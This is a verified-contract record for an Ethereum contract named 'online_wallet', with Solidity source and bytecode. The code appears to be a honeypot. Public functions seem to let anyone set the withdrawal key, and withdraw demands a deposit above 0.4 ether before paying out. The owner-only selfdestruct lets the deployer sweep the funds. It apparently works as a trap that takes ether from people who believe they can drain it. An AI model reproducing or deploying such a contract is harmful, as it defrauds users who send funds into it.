{
  "address": "0xa1a56c01a6DC24dB4Efe9D0d8DE06a44f0B3838d",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "online_wallet",
  "compilerVersion": "v0.4.25+commit.59dbf8f1",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-04-27\n*/\n\npragma solidity ^0.4.25;\n\ncontract online_wallet\n{\n    bytes32 keyHash;\n    address owner;\n    bytes32 wallet_id = 0xe0b52b783318a6cd9d8e48a2646c9787b38de806ae837557158f0564b142e2ff;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function withdraw(string key) public payable\n    {\n        require(msg.sender == tx.origin);\n        if(keyHash == keccak256(abi.encodePacked(key))) {\n            if(msg.value > 0.4 ether) {\n                msg.sender.transfer(address(this).balance);\n            }\n        }\n    }\n\n    function setup_key(string key) public\n    {\n        if (keyHash == 0x0) {\n            keyHash = keccak256(abi.encodePacked(key));\n        }\n    }\n\n    function chagne_hash(bytes32 new_hash) public\n    {\n        if (keyHash == 0x0) {\n            keyHash = new_hash;\n        }\n    }\n\n    function clear() public\n    {\n        require(msg.sender == owner);\n        selfdestruct(owner);\n    }\n\n    function get_id() public view returns(bytes32){\n        return wallet_id;\n    }\n\n    function () public payable {\n    }\n}",
  "bytecode": "60806040527fe0b52b783318a6cd9d8e48a2646c9787b38de806ae837557158f0564b142e2ff60025534801561003457600080fd5b5060018054600160a060020a031916331790556103d2806100566000396000f30060806040526004361061006c5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166331fb67c2811461006e57806352efea6e146100ba57806376e5c54a146100cf5780637ccb13c4146100e7578063f43fa80514610140575b005b6040805160206004803580820135601f810184900484028501840190955284845261006c9436949293602493928401919081908401838280828437509497506101679650505050505050565b3480156100c657600080fd5b5061006c610282565b3480156100db57600080fd5b5061006c6004356102c1565b3480156100f357600080fd5b506040805160206004803580820135601f810184900484028501840190955284845261006c9436949293602493928401919081908401838280828437509497506102cf9650505050505050565b34801561014c57600080fd5b506101556103a0565b60408051918252519081900360200190f35b33321461017357600080fd5b806040516020018082805190602001908083835b602083106101a65780518252601f199092019160209182019101610187565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040516020818303038152906040526040518082805190602001908083835b602083106102095780518252601f1990920191602091820191016101ea565b5181516020939093036101000a600019018019909116921691909117905260405192018290039091206000541415925061027f9150505767058d15e17628000034111561027f576040513390303180156108fc02916000818181858888f1935050505015801561027d573d6000803e3d6000fd5b505b50565b60015473ffffffffffffffffffffffffffffffffffffffff1633146102a657600080fd5b60015473ffffffffffffffffffffffffffffffffffffffff16ff5b600054151561027f57600055565b600054151561027f57806040516020018082805190602001908083835b6020831061030b5780518252601f1990920191602091820191016102ec565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040516020818303038152906040526040518082805190602001908083835b6020831061036e5780518252601f19909201916020918201910161034f565b5181516020939093036101000a6000190180199091169216919091179052604051920182900390912060005550505050565b600254905600a165627a7a7230582050e33f40eb32eb2097bd466243476a3b67a2b1be239677e1189eff0afcf90b130029"
}